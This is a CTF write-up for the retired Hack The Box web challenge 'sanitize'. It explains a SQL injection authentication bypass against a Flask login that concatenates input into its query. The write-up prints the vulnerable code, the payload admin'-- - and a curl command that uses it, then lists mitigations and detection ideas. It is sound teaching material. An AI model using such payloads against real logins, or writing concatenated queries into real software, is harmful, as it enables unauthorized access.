---
challenge: sanitize
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, flask, sqlite, sqli, authentication-bypass, source-disclosure]
---

# sanitize — Hack The Box (Challenge)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flag.

## TL;DR

The Flask application builds the login query by concatenating username and password. `/debug` returns the full source. A SQL comment in the username skips the password check and logs in as `admin`.

## Statement and surface

- Web, Easy, retired.
- A URL with a login form is provided.
- The goal is to reach the admin panel.

```bash
curl -s -I http://<IP>:<PORT>/
```

## Reconnaissance

- Flask with a single `/` route and a POST form.
- The HTML references `/debug`.
- `/debug` returns `app.py` as plain text.

```bash
curl -s http://<IP>:<PORT>/debug
```

## Code analysis

The query is built with string formatting:

```python
q = "select * from users where username = '%s' AND password = '%s';" % (
    request.form.get("username", ""),
    request.form.get("password", ""),
)
login = query_db(q, one=True)
```

There are no parameterized queries. The application then checks whether the returned user is `admin`.

## Why it works

A username such as `admin'-- -` closes the string and comments out the rest of the query, including the password condition. SQLite returns the `admin` row and the application displays the flag.

```text
select * from users where username = 'admin'-- -' AND password = '';
```

## Local reproduction

```bash
python3 -m venv venv
. venv/bin/activate
pip install flask
python app.py
```

- Create the sample database if needed.
- Submit the payload to the form.
- Check the response.

## Exploitation

```bash
curl -s -X POST http://<IP>:<PORT>/ \
  --data-urlencode "username=admin'-- -" \
  --data-urlencode "password=x"
```

The response contains the flag; it is redacted. `sqlmap` against the `username` parameter also works, but is unnecessary.

## Evidence

- `/debug` source with the query highlighted.
- Request and response with the payload.
- Redacted flag.

## Lessons learned

- Concatenating input into SQL is injection, even in a tiny form.
- A debug route can leak the entire codebase.
- The SQL comment (`--`) is enough to remove the password condition.

## Mitigations and detection

- Use parameterized queries and an ORM correctly.
- Do not expose `/debug` or source code in production.
- Apply input validation and least privilege to the database.
- Alert on SQL errors, payloads containing `--` and access to debug routes.

## References

- <https://www.hackthebox.com/challenges/sanitize>
- <https://owasp.org/www-community/attacks/SQL_Injection>
- <https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html>
- <https://attack.mitre.org/techniques/T1190/>
